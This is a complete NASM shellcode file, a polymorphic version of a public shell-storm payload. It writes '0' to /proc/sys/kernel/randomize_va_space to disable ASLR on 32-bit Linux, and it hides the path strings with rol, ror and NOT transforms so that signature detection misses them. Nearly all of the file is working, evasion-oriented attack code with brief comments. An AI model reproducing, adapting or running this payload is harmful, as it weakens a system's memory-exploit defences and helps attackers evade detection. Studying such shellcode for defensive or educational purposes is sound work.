; Filename: disable_aslr_poly.nasm
; Author:  Matteo Malvica
; Original shellcode: http://shell-storm.org/shellcode/files/shellcode-813.php
; Website:  http://www.matteomalvica.com
; Size: 110 bytes

global _start

section .text

_start:
    xor eax,eax
    push eax
    mov ecx, 0x06563617		; modified '0x65636170' with rol
    rol ecx, 4
    push ecx
    mov ecx, 0x35f61767		; modified '0x735f6176' with ror
    ror ecx, 4
    push ecx
    push dword 0x5f657a69  	; unaltered
    push dword 0x6d6f646e	; unaltered
    mov ecx, 0x9E8DD093         ; NOTted '0x61722f6c'
    not ecx
    push ecx
    mov ecx, 0x9A918D9A		; NOTted '0x656e7265' 
    not ecx
    push ecx
    mov ecx, 0x94D08C86		; NOTted '0x6b2f7379' 
    not ecx
    push ecx
    mov ecx, 0xf732f636		; modified '0x732f636f' with rol
    rol ecx, 4
    push ecx
    mov ecx, 0x2702f2f7		; modified '0x72702f2f' with ror
    ror ecx, 4
    push ecx
    mov ebx,esp
    mov cx,0x2bc
    mov al,0x8
    int 0x80
    mov ebx,eax                ; equivalent and smaller than 'mov eax, ebx'
    push eax
    mov dx,0x3a30
    push dx
    mov ecx,esp
    xor edx,edx
    inc edx
    mov al,0x4                ; write syscall
    int 0x80
    push byte 6 	       ; 'close' syscall from the stack
    pop eax                
    int 0x80
    mov al,0x1   	      ; 'exit' syscall via direct access
    int 0x80    
